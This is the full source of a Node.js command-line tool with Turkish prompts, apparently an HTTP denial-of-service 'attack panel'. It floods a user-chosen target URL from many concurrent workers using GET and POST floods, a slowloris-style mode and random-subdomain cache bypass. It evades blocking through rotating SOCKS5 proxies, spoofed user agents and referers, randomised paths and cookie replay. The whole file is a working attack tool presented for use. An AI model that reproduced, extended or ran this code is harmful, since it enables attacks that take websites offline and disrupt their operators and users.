const axios = require('axios').default;
const fs = require('fs').promises;
const colors = require('colors');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { randomInt } = require('crypto');
const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
});

function logStatus(message, color = 'white') {
    console.log(message[color]);
}

const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
];

const referers = ['https://google.com', 'https://bing.com', 'https://youtube.com'];

let proxies = [];

async function loadProxies() {
    logStatus('Proxy’ler yükleniyor...', 'cyan');
    try {
        const data = await fs.readFile('proxies.txt', 'utf8');
        proxies = data.split('\n').map(line => line.trim()).filter(Boolean);
        logStatus(`${proxies.length} proxy yüklendi!`, 'green');
    } catch (err) {
        logStatus('Proxy dosyası yok, direkt bağlanılıyor.', 'yellow');
    }
}

const getRandom = arr => arr[Math.floor(Math.random() * arr.length)];
const getRandomQuery = () => '?r=' + Math.random().toString(36).slice(2);
const getRandomPath = () => '/p' + Math.random().toString(36).slice(2, 8);
const randomDelay = () => new Promise(resolve => setTimeout(resolve, randomInt(20, 300)));

async function testProxy(proxy) {
    try {
        const [host, port] = proxy.split(':');
        const agent = new SocksProxyAgent(`socks5://${host}:${port}`);
        await axios.get('https://api.ipify.org', { httpAgent: agent, httpsAgent: agent, timeout: 3000 });
        return true;
    } catch (error) {
        return false;
    }
}

function getRandomSubdomain(url) {
    if (Math.random() > 0.7) return url;
    const [protocol, , domain] = url.split('/');
    const sub = Math.random().toString(36).slice(2, 8);
    return `${protocol}//${sub}.${domain}`;
}

async function sendRequest(targetUrl, cookies = {}, method = 'GET') {
    const headers = {
        'User-Agent': getRandom(userAgents),
        'Accept': getRandom(['text/html,application/xhtml+xml', 'application/json', '*/*']),
        'Accept-Language': getRandom(['en-US,en;q=0.9', 'tr-TR,tr;q=0.8']),
        'Referer': getRandom(referers),
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
    };

    if (Object.keys(cookies).length) {
        headers['Cookie'] = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
    }

    const config = {
        headers,
        timeout: 8000,
        maxRedirects: 10,
        validateStatus: () => true,
    };

    const proxy = getRandom(proxies);
    if (proxy && (await testProxy(proxy))) {
        const [host, port] = proxy.split(':');
        const agent = new SocksProxyAgent(`socks5://${host}:${port}`);
        config.httpAgent = agent;
        config.httpsAgent = agent;
    }

    try {
        let url = method === 'SUBDOMAIN' ? getRandomSubdomain(targetUrl) : targetUrl;
        url += Math.random() > 0.5 ? getRandomQuery() : getRandomPath();

        let response;
        if (method === 'POST') {
            response = await axios.post(url, { data: Math.random() }, config);
        } else if (method === 'SLOWLORIS') {
            await randomDelay();
            response = await axios.get(url, { ...config, timeout: 20000 });
        } else {
            response = await axios.get(url, config);
        }

        let newCookies = { ...cookies };
        if (response.headers['set-cookie']) {
            response.headers['set-cookie'].forEach(cookie => {
                const [keyValue] = cookie.split(';');
                const [key, value] = keyValue.split('=');
                newCookies[key] = value;
            });
        }

        return {
            success: response.status < 400 || [403, 503].includes(response.status),
            status: response.status,
            cookies: newCookies,
        };
    } catch (error) {
        return {
            success: false,
            error: error && error.message ? error.message : 'Bilinmeyen hata',
            cookies,
        };
    }
}

async function getUserInput() {
    console.clear();
    console.log('\n🌟 ' + 'SÜPER SALDIRI PANELI'.rainbow.bold + ' 🌟');
    console.log('Method seç:'.cyan);
    console.log('1 - GET Flood (Hızlı)'.green);
    console.log('2 - POST Flood (Form)'.green);
    console.log('3 - Slowloris (Yavaş)'.green);
    console.log('4 - Subdomain (Cache Bypass)'.green);
    console.log('5 - Karışık (Hepsi)'.green);

    const methodNum = await new Promise(resolve => rl.question('Seçim (1-5): ', resolve));
    const methodMap = { '1': 'GET', '2': 'POST', '3': 'SLOWLORIS', '4': 'SUBDOMAIN', '5': 'MIXED' };
    const method = methodMap[methodNum] || 'GET';

    const url = await new Promise(resolve => rl.question('Hedef URL (örn: http://example.com): ', resolve));
    if (!/^https?:\/\//.test(url)) throw new Error('URL http:// veya https:// ile başlamalı!');

    const duration = parseInt(await new Promise(resolve => rl.question('Süre (saniye, örn: 60): ', resolve))) || 60;
    const threads = parseInt(await new Promise(resolve => rl.question('Thread (örn: 10): ', resolve))) || 10;

    if (duration < 1 || threads < 1) throw new Error('Süre ve thread pozitif olmalı!');

    return { method, url, duration, threads };
}

async function megaBypassAttack({ method, url, duration, threads }) {
    await loadProxies();
    console.clear();
    console.log('\n⚡ ' + 'SALDIRI BAŞLADI!'.rainbow.bold + ' ⚡');
    console.log(`🔗 Hedef: ${url.cyan}`);
    console.log(`⏰ Süre: ${duration}s`.cyan);
    console.log(`⚙️ Thread: ${threads}`.cyan);
    console.log(`🔥 Method: ${method}`.cyan);

    logStatus('Hazırlanıyor...', 'cyan');
    const endTime = Date.now() + duration * 1000;
    let successCount = 0;
    let failCount = 0;
    let cookies = {};

    async function worker() {
        while (Date.now() < endTime) {
            await randomDelay();
            const selectedMethod = method === 'MIXED' ? getRandom(['GET', 'POST', 'SLOWLORIS', 'SUBDOMAIN']) : method;
            const result = await sendRequest(url, cookies, selectedMethod);
            cookies = result.cookies;

            if (result.success) {
                successCount++;
                process.stdout.write(`[+] ${result.status} `.green);
            } else {
                const errorMessage = result.error ? result.error.slice(0, 20) : 'HATA';
                failCount++;
                process.stdout.write(`[-] ${errorMessage} `.red);
            }
        }
    }

    const workers = Array.from({ length: threads }, () => worker());
    logStatus('Saldırı aktif!', 'green');
    await Promise.all(workers);
    rl.close();
}

// Programı başlat
getUserInput()
    .then(megaBypassAttack)
    .catch(err => {
        console.error('HATA:', err.message.red);
        rl.close();
    });
